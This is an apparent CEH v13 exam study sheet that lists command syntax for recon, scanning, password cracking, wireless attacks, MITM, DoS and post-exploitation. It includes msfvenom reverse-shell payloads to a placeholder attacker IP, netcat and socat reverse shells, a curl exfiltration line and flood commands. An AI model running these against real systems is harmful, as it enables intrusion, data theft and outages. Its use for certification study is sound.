# ⚡ CEH v13 Complete Commands & Syntax Guide
---

## 🔹 Footprinting & Reconnaissance

**theHarvester** – Gather emails, subdomains, IPs  
```bash
theHarvester -d example.com -l 100 -b google
theHarvester -d example.com -b all -f output.html
```

**whois** – Domain registration info  
```bash
whois example.com
whois 8.8.8.8
```

**dig** – Query DNS records  
```bash
dig ANY example.com
dig MX example.com
dig @8.8.8.8 example.com
dig -x 8.8.8.8  # Reverse DNS
```

**nslookup** – DNS lookup (Windows/Linux)  
```bash
nslookup example.com
nslookup -type=MX example.com
```

**dnsrecon** – Advanced DNS enumeration  
```bash
dnsrecon -d example.com -t axfr
dnsrecon -d example.com -t brt -D subdomains.txt
```

**subfinder** – Subdomain discovery  
```bash
subfinder -d example.com -silent
subfinder -d example.com -o subdomains.txt
```

**amass** – Advanced subdomain enumeration  
```bash
amass enum -d example.com
amass enum -brute -d example.com
```

**fierce** – DNS scanner  
```bash
fierce -dns example.com
```

**dmitry** – All-in-one reconnaissance  
```bash
dmitry -winsepo example.com
```

**Maltego** – OSINT investigation platform  
```bash
# GUI-based tool - transforms for data gathering
```

---

## 🔹 Scanning & Enumeration

### Network Scanning

**nmap** – Network discovery & port scanning  
```bash
# Discovery scans
nmap -sn 192.168.1.0/24                    # Host discovery
nmap -sS -sV -A -p- target                 # Full TCP scan
nmap -sU --top-ports 1000 target           # UDP scan
nmap -sS -O target                         # OS detection
nmap --script vuln target                  # Vulnerability scripts

# Stealth scans
nmap -sS target                            # SYN stealth
nmap -sF target                            # FIN scan
nmap -sN target                            # NULL scan
nmap -sX target                            # XMAS scan

# NSE scripts (frequently tested)
nmap --script smb-enum-shares target
nmap --script http-enum target
nmap --script ftp-anon target
nmap --script smtp-enum-users target
```

**rustscan** – Fast port scanner  
```bash
rustscan -a target --ulimit 5000 -- -sV
```

**masscan** – High-speed port scanner  
```bash
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

**hping3** – Advanced ping utility  
```bash
hping3 -S -p 80 target                     # SYN flood
hping3 -A -p 80 target                     # ACK scan
hping3 -F -P -U -p 80 target               # FIN/PUSH/URG flags
```

### Service Enumeration

**enum4linux** – SMB/NetBIOS enumeration  
```bash
enum4linux -a target                       # All enumeration
enum4linux -U target                       # Users only
enum4linux -S target                       # Shares only
enum4linux -P target                       # Password policy
```

**smbclient** – SMB client  
```bash
smbclient -L //target -N                   # List shares (null session)
smbclient //target/share -N                # Access share
```

**snmpwalk** – SNMP enumeration  
```bash
snmpwalk -v2c -c public target
snmpwalk -v2c -c private target 1.3.6.1.4.1
```

**nbtscan** – NetBIOS scanner  
```bash
nbtscan -r 192.168.1.0/24
```

**nbtstat** – NetBIOS info (Windows)  
```bash
nbtstat -A targetIP
nbtstat -n                                 # Local NetBIOS names
```

**rpcinfo** – RPC service info  
```bash
rpcinfo -p target
```

---

## 🔹 Vulnerability Assessment

**OpenVAS** – Comprehensive vulnerability scanner  
```bash
# GUI-based - creates detailed vulnerability reports
```

**Nessus** – Professional vulnerability scanner  
```bash
# Web-based interface - policy-based scanning
```

**nikto** – Web vulnerability scanner  
```bash
nikto -h http://target
nikto -h http://target:8080
nikto -h http://target -o results.txt
nikto -h http://target -Tuning 9           # Specific tests
```

**dirb** – Directory brute forcer  
```bash
dirb http://target
dirb http://target /usr/share/wordlists/dirb/big.txt
dirb http://target -X .php,.txt,.html      # Extensions
```

**gobuster** – Advanced directory/DNS brute forcer  
```bash
gobuster dir -u http://target -w wordlist.txt -t 50
gobuster dns -d target.com -w subdomains.txt
gobuster vhost -u http://target -w wordlist.txt
```

**ffuf** – Fast web fuzzer  
```bash
ffuf -w wordlist.txt -u http://target/FUZZ
ffuf -w wordlist.txt -u http://FUZZ.target.com    # Subdomain fuzzing
ffuf -w wordlist.txt -X POST -d "param=FUZZ" -u http://target/
```

**wpscan** – WordPress vulnerability scanner  
```bash
wpscan --url http://target.com
wpscan --url http://target.com --enumerate u,p,t  # Users, plugins, themes
```

**joomscan** – Joomla vulnerability scanner  
```bash
joomscan -u http://target.com
```

---

## 🔹 System Hacking & Exploitation

### Metasploit Framework

**msfconsole** – Main Metasploit interface  
```bash
msfconsole
search type:exploit platform:windows
search cve:2021-34527
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attackerIP
set LPORT 4444
exploit
exploit -j                                 # Background job
```

**msfvenom** – Payload generator  
```bash
# Windows payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=attackerIP LPORT=4444 -f exe -o shell.exe

# Linux payloads  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attackerIP LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter_reverse_tcp LHOST=attackerIP LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attackerIP LPORT=4444 -f raw -o shell.jsp

# Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=attackerIP LPORT=4444 -o payload.apk
```

### Password Attacks

**hydra** – Network login brute forcer  
```bash
hydra -l admin -P passwords.txt ssh://target
hydra -L users.txt -P passwords.txt ftp://target
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt rdp://target
hydra -l admin -P passwords.txt target smb
```

**john** – Password cracker  
```bash
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt                     # Show cracked passwords
john --incremental hashes.txt              # Brute force mode
john --format=NT hashes.txt --wordlist=wordlist.txt
```

**hashcat** – GPU-accelerated password cracking  
```bash
hashcat -m 1000 hashes.txt rockyou.txt     # NTLM hashes
hashcat -m 0 hashes.txt rockyou.txt        # MD5 hashes  
hashcat -m 100 hashes.txt rockyou.txt      # SHA1 hashes
hashcat -m 1800 hashes.txt rockyou.txt     # Linux shadow hashes
hashcat -a 3 -m 1000 hashes.txt ?l?l?l?l?d?d?d?d  # Mask attack
```

**medusa** – Alternative login brute forcer  
```bash
medusa -h target -u admin -P passwords.txt -M ssh
medusa -h target -U users.txt -P passwords.txt -M ftp
```

**ncrack** – Network authentication cracker  
```bash
ncrack -vv --user admin -P passwords.txt rdp://target
ncrack -vv -U users.txt -P passwords.txt ssh://target
```

### Privilege Escalation Tools

**LinPEAS** – Linux privilege escalation  
```bash
./linpeas.sh
```

**WinPEAS** – Windows privilege escalation  
```bash
winpeas.exe
```

**PowerUp** – PowerShell privilege escalation  
```powershell
Import-Module PowerUp.ps1
Invoke-AllChecks
```

---

## 🔹 Web Application Testing

**sqlmap** – Automated SQL injection  
```bash
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables  
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --dump
sqlmap --data="id=1&name=test" -u "http://target.com/login.php"
sqlmap -u "http://target.com/page.php?id=1" --os-shell
sqlmap -u "http://target.com/page.php?id=1" --batch --risk=3 --level=5
```

**burpsuite** – Web application security testing  
```bash
# GUI-based proxy tool
# Default proxy: 127.0.0.1:8080
```

**owasp-zap** – Web application scanner  
```bash
zaproxy
zap-cli start
zap-cli spider http://target.com
zap-cli active-scan http://target.com
```

**wafw00f** – WAF detection  
```bash
wafw00f http://target.com
wafw00f -a http://target.com               # All detection methods
```

**whatweb** – Website fingerprinting  
```bash
whatweb target.com
whatweb -v target.com                      # Verbose mode
```

**xsser** – XSS detection tool  
```bash
xsser --url "http://target.com/search.php?q=XSS"
```

---

## 🔹 Wireless Network Hacking

### Monitor Mode & Capture

**airmon-ng** – Wireless interface management  
```bash
airmon-ng start wlan0                      # Enable monitor mode
airmon-ng stop wlan0mon                    # Disable monitor mode
airmon-ng check kill                       # Kill interfering processes
```

**airodump-ng** – Wireless packet capture  
```bash
airodump-ng wlan0mon                       # Scan for networks
airodump-ng -c 6 --bssid MAC -w capture wlan0mon  # Targeted capture
airodump-ng -c 6 --bssid MAC --write capture wlan0mon
```

**aireplay-ng** – Wireless packet injection  
```bash
aireplay-ng --deauth 10 -a APMAC -c CLIENTMAC wlan0mon
aireplay-ng --fakeauth 0 -a APMAC wlan0mon
aireplay-ng --arpreplay -b APMAC -h CLIENTMAC wlan0mon
```

### Cracking

**aircrack-ng** – WEP/WPA cracking  
```bash
aircrack-ng capture.cap -w wordlist.txt    # WPA/WPA2 cracking
aircrack-ng capture.cap                    # WEP cracking
aircrack-ng capture.cap -b APMAC -w wordlist.txt
```

**reaver** – WPS PIN attack  
```bash
reaver -i wlan0mon -b APMAC -vv
reaver -i wlan0mon -b APMAC -c 6 -vv
```

**wifite** – Automated wireless attack  
```bash
wifite --wpa --dict wordlist.txt
```

**kismet** – Wireless network detector  
```bash
kismet
```

---

## 🔹 Malware & Trojan Analysis

### Static Analysis

**strings** – Extract printable strings  
```bash
strings malware.exe
strings -a malware.exe | grep -i http
```

**file** – Determine file type  
```bash
file suspicious_file
```

**hexdump** – Hexadecimal dump  
```bash
hexdump -C malware.exe | head -20
```

**objdump** – Object file disassembler  
```bash
objdump -d malware.exe
```

**readelf** – ELF file information  
```bash
readelf -h malware.elf
readelf -S malware.elf
```

### Dynamic Analysis

**ltrace** – Library call tracer  
```bash
ltrace ./malware
```

**strace** – System call tracer  
```bash
strace ./malware
strace -o trace.log ./malware
```

**wireshark** – Network packet analysis  
```bash
wireshark
```

### PE Analysis Tools

**pestudio** – Windows PE analysis  
```bash
# GUI-based PE analysis tool
```

**peid** – PE identifier  
```bash
# Windows GUI tool for PE identification
```

---

## 🔹 Social Engineering & Phishing

**setoolkit** – Social Engineer Toolkit  
```bash
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors  
# 3) Infectious Media Generator
```

**gophish** – Phishing campaign toolkit  
```bash
# Web-based phishing framework
# Default: https://localhost:3333
```

**king-phisher** – Phishing campaign toolkit  
```bash
# GUI-based phishing framework
```

**shellphish** – Social media phishing  
```bash
shellphish
```

---

## 🔹 Steganography & Cryptography

### Steganography Tools

**steghide** – Hide data in images/audio  
```bash
steghide embed -cf cover.jpg -ef secret.txt -p password
steghide extract -sf stego.jpg -p password
steghide info cover.jpg
```

**stegsolve** – Image analysis tool  
```bash
# GUI-based image steganography solver
```

**binwalk** – Firmware analysis  
```bash
binwalk firmware.bin
binwalk -e firmware.bin                    # Extract embedded files
```

**foremost** – File carving  
```bash
foremost -i disk_image.dd -o output/
```

**exiftool** – Metadata viewer/editor  
```bash
exiftool image.jpg
exiftool -all= image.jpg                   # Remove all metadata
```

### Cryptography

**openssl** – Cryptographic toolkit  
```bash
openssl genrsa -out private.key 2048       # Generate RSA key
openssl rsa -in private.key -pubout -out public.key
openssl enc -aes-256-cbc -in file.txt -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file.txt
```

**gpg** – GNU Privacy Guard  
```bash
gpg --gen-key                              # Generate key pair
gpg --encrypt -r recipient file.txt
gpg --decrypt file.txt.gpg
```

---

## 🔹 Mobile Device Security

### Android Analysis

**adb** – Android Debug Bridge  
```bash
adb devices                                # List connected devices
adb shell                                  # Access device shell
adb push file.txt /sdcard/                 # Upload file
adb pull /sdcard/file.txt .                # Download file
adb install app.apk                        # Install APK
adb logcat                                 # View system logs
```

**apktool** – APK reverse engineering  
```bash
apktool d app.apk                          # Decompile APK
apktool b app/                             # Recompile APK
```

**dex2jar** – Convert DEX to JAR  
```bash
dex2jar app.apk
```

**jd-gui** – Java decompiler  
```bash
# GUI-based Java decompiler
```

### iOS Analysis (Limited without jailbreak)

**ideviceinfo** – iOS device information  
```bash
ideviceinfo
```

**3uTools** – iOS management tool  
```bash
# Windows/Mac GUI tool
```

---

## 🔹 IoT & Cloud Security

### IoT Testing

**nmap** – IoT device discovery  
```bash
nmap -sU -p 1900 --script upnp-info 192.168.1.0/24
nmap -p 502 --script modbus-discover 192.168.1.0/24
```

**shodan** – IoT search engine  
```bash
# Web interface: https://shodan.io
# CLI: shodan search "default password"
```

**mqtt** – MQTT testing  
```bash
mosquitto_sub -h target -t '#' -v          # Subscribe to all topics
mosquitto_pub -h target -t 'topic' -m 'message'  # Publish message
```

### Cloud Security

**aws-cli** – AWS command line  
```bash
aws configure                              # Configure credentials
aws s3 ls                                  # List S3 buckets
aws ec2 describe-instances                 # List EC2 instances
```

**scout** – Multi-cloud security auditing  
```bash
scout aws                                  # AWS security audit
```

---

## 🔹 Network Attacks & MITM

**ettercap** – Comprehensive MITM framework  
```bash
ettercap -T -M arp:remote /target1/ /target2/     # ARP spoofing
ettercap -T -M dns /target/ /gateway/              # DNS spoofing
```

**bettercap** – Modern network attack framework  
```bash
bettercap -iface eth0
# Interactive commands:
# net.probe on
# set arp.spoof.targets 192.168.1.100
# arp.spoof on
```

**arpspoof** – ARP spoofing attack  
```bash
arpspoof -i eth0 -t target gateway
arpspoof -i eth0 -t gateway target
```

**driftnet** – Extract images from network traffic  
```bash
driftnet -i eth0 -d /tmp/images/
```

**sslstrip** – SSL stripping attack  
```bash
sslstrip -l 8080
```

**responder** – LLMNR/NBT-NS poisoner  
```bash
responder -I eth0
responder -I eth0 -A                       # Analyze mode
responder -I eth0 -w                       # WPAD rogue proxy
```

---

## 🔹 Denial of Service (DoS)

**hping3** – Advanced packet crafting  
```bash
hping3 -S --flood -V target -p 80          # SYN flood
hping3 -1 --flood target                   # ICMP flood  
hping3 -2 --flood target -p 80             # UDP flood
```

**slowloris** – Slow HTTP DoS  
```bash
slowloris target.com
```

**LOIC** – Low Orbit Ion Cannon  
```bash
# GUI-based DoS tool (Windows)
```

**hulk** – HTTP Unbearable Load King  
```bash
python hulk.py target.com
```

---

## 🔹 Post-Exploitation & Persistence

### Network Tools

**netcat** – Network swiss army knife  
```bash
nc -lvnp 4444                              # Listen for connections
nc target 80                               # Connect to port
nc -e /bin/bash target 4444                # Reverse shell (if -e supported)
nc -lu target 4444 < file.txt             # File transfer (sender)
nc -l 4444 > received_file.txt             # File transfer (receiver)
```

**socat** – Advanced netcat replacement  
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash  # Bind shell
socat TCP:target:4444 EXEC:/bin/bash,pty,stderr      # Reverse shell
```

### Data Exfiltration

**scp** – Secure copy over SSH  
```bash
scp file.txt user@target:/tmp/
scp user@target:/tmp/file.txt .
```

**rsync** – Remote file synchronization  
```bash
rsync -avz /local/path/ user@target:/remote/path/
```

**curl** – Data transfer tool  
```bash
curl -X POST -d @file.txt http://target.com/upload
curl -o downloaded_file.txt http://target.com/file.txt
```

**wget** – Web content retriever  
```bash
wget http://target.com/file.txt
wget -r http://target.com/                 # Recursive download
```

---

## 🔹 Digital Forensics & Incident Response

### Disk Analysis

**dd** – Disk imaging  
```bash
dd if=/dev/sda of=disk_image.dd bs=4096
dd if=disk_image.dd of=/dev/sdb bs=4096    # Restore image
```

**dcfldd** – Enhanced dd  
```bash
dcfldd if=/dev/sda of=disk_image.dd hash=sha256
```

**volatility** – Memory analysis  
```bash
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 netscan
```

**autopsy** – Digital forensics platform  
```bash
# GUI-based forensics tool
```

### Log Analysis

**grep** – Text search  
```bash
grep -r "failed login" /var/log/
grep -i "error" logfile.txt
grep -E "192\.168\.1\.[0-9]+" logfile.txt  # Regex search
```

**awk** – Pattern scanning  
```bash
awk '/error/ {print $1, $4}' logfile.txt
```

**sed** – Stream editor  
```bash
sed -n '100,200p' logfile.txt             # Print lines 100-200
```

---

## 🔹 AI-Enhanced Security (New in CEH v13)

### AI-Powered Tools

**DeepExploit** – AI penetration testing  
```bash
# Machine learning based vulnerability discovery
```

**Automated Threat Modeling** – AI risk assessment  
```bash
# AI-driven security architecture analysis
```

**Behavioral Analysis** – AI anomaly detection  
```bash
# Machine learning based user behavior analysis  
```

---

## 🔹 Encoding & Decoding

**base64** – Base64 encoding/decoding  
```bash
echo "text" | base64                       # Encode
echo "dGV4dA==" | base64 -d                # Decode
```

**url encoding/decoding**  
```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('test data'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('test%20data'))"
```

**hex encoding/decoding**  
```bash
echo "text" | xxd                          # To hex
echo "74657874" | xxd -r -p                # From hex
```

**CyberChef** – Browser-based encoding  
```bash
# Web interface: https://gchq.github.io/CyberChef/
```

---

## 🔹 Hash Generation & Analysis

**md5sum** – MD5 hash generation  
```bash
md5sum file.txt
echo "text" | md5sum
```

**sha256sum** – SHA256 hash generation  
```bash
sha256sum file.txt  
echo "text" | sha256sum
```

**hash-identifier** – Hash type identification  
```bash
hash-identifier
# Interactive hash identification tool
```

---

## 📌 CEH v13 Exam-Specific Tips

### Command Recognition Patterns
- **nmap outputs:** Learn to identify different scan types from output
- **Wireshark filters:** Memorize common display filter syntax
- **Metasploit modules:** Know exploit/payload naming conventions
- **Log formats:** Recognize Apache, IIS, Windows Event Log formats

### Frequently Tested Scenarios
1. **"Which command performs X?"** → Exact syntax memorization
2. **"What tool generated this output?"** → Output format recognition  
3. **"What is the next step after X?"** → Attack methodology flow
4. **"Which flag/option does Y?"** → Switch memorization

### High Probability Questions
- Nmap NSE scripts for specific services
- Metasploit payload generation with msfvenom
- SQL injection with sqlmap automation
- Wireless WPA handshake capture sequence
- Hash cracking mode selection in hashcat
- Steganography tools for hidden data
- Social engineering toolkit (SET) options

---

## 🚨 Final Exam Success Formula

1. **Memorize exact command syntax** - EC-Council tests precise formatting
2. **Practice tool output recognition** - Many questions show output first
3. **Understand attack methodology flow** - Know what comes after each step
4. **Focus on switches/flags** - These are heavily tested
5. **Study error messages** - Troubleshooting questions are common
---
